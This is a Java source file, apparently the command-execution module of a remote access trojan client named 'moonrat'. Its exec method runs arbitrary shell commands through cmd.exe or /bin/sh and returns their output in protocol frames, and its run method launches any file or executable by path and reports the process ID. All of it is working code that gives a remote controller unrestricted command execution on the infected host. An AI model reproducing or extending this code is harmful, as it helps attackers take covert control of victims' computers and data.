package moonrat.client.tasks;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.nio.charset.CharsetDecoder;
import java.nio.charset.CodingErrorAction;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import moonrat.Protocol;
import moonrat.Protocol.Frame;

public final class ShellTasks {
    private static final int TIMEOUT_SECONDS = 60;

    private ShellTasks() {}

    public static Frame exec(String command) {
        Frame response = new Frame(Protocol.EXEC_RESP);
        try {
            ProcessBuilder builder = isWindows()
                    ? new ProcessBuilder("cmd.exe", "/c", "chcp 65001>nul & " + command)
                    : new ProcessBuilder("/bin/sh", "-c", command);
            builder.redirectErrorStream(true);

            Process process = builder.start();
            try {
                process.getOutputStream().close();
            } catch (IOException ignored) {
            }

            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            Thread pump = new Thread(() -> {
                try {
                    process.getInputStream().transferTo(buffer);
                } catch (IOException ignored) {
                }
            }, "exec-pump");
            pump.setDaemon(true);
            pump.start();

            boolean finished = process.waitFor(TIMEOUT_SECONDS, TimeUnit.SECONDS);
            if (!finished) process.destroyForcibly();
            pump.join(2000);

            int exit = finished ? process.exitValue() : -2;
            response.fields = new ArrayList<>(List.of(String.valueOf(exit), finished ? "" : "timeout"));
            response.blob = decode(buffer.toByteArray()).getBytes(StandardCharsets.UTF_8);
        } catch (Exception failure) {
            response.fields = new ArrayList<>(List.of("-1", String.valueOf(failure)));
        }
        return response;
    }

    public static Frame run(String path, String arguments) {
        Frame response = new Frame(Protocol.RUN_RESP);
        try {
            if (path == null || path.isEmpty()) throw new IOException("no path");

            Path target = Paths.get(path);
            if (!Files.exists(target)) throw new IOException("not found: " + path);

            boolean executable = isWindows()
                    ? path.toLowerCase().matches(".*\\.(exe|bat|cmd|com|ps1|msi)$")
                    : Files.isExecutable(target);

            ProcessBuilder builder;
            if (executable) {
                List<String> command = new ArrayList<>();
                command.add(path);
                command.addAll(splitArguments(arguments));
                builder = new ProcessBuilder(command);
            } else if (isWindows()) {
                builder = new ProcessBuilder("cmd.exe", "/c", "start", "", path);
            } else {
                builder = new ProcessBuilder("xdg-open", path);
            }

            Path parent = target.toAbsolutePath().getParent();
            if (parent != null) builder.directory(parent.toFile());
            builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            builder.redirectError(ProcessBuilder.Redirect.DISCARD);

            Process process = builder.start();
            response.fields = new ArrayList<>(List.of("", String.valueOf(process.pid())));
        } catch (Exception failure) {
            response.fields = new ArrayList<>(List.of(String.valueOf(failure), ""));
        }
        return response;
    }

    private static List<String> splitArguments(String raw) {
        List<String> parts = new ArrayList<>();
        if (raw == null) return parts;

        StringBuilder current = new StringBuilder();
        char quote = 0;
        for (char character : raw.toCharArray()) {
            if (quote != 0) {
                if (character == quote) quote = 0;
                else current.append(character);
            } else if (character == '"' || character == '\'') {
                quote = character;
            } else if (Character.isWhitespace(character)) {
                if (current.length() > 0) {
                    parts.add(current.toString());
                    current.setLength(0);
                }
            } else {
                current.append(character);
            }
        }

        if (current.length() > 0) parts.add(current.toString());
        return parts;
    }

    private static String decode(byte[] data) {
        try {
            CharsetDecoder decoder = StandardCharsets.UTF_8.newDecoder()
                    .onMalformedInput(CodingErrorAction.REPORT)
                    .onUnmappableCharacter(CodingErrorAction.REPORT);
            return decoder.decode(ByteBuffer.wrap(data)).toString();
        } catch (Exception failure) {
            try {
                return new String(data, Charset.forName(isWindows() ? "IBM866" : "ISO-8859-1"));
            } catch (Exception ignored) {
                return new String(data, StandardCharsets.UTF_8);
            }
        }
    }

    private static boolean isWindows() {
        return System.getProperty("os.name").toLowerCase().contains("win");
    }
}
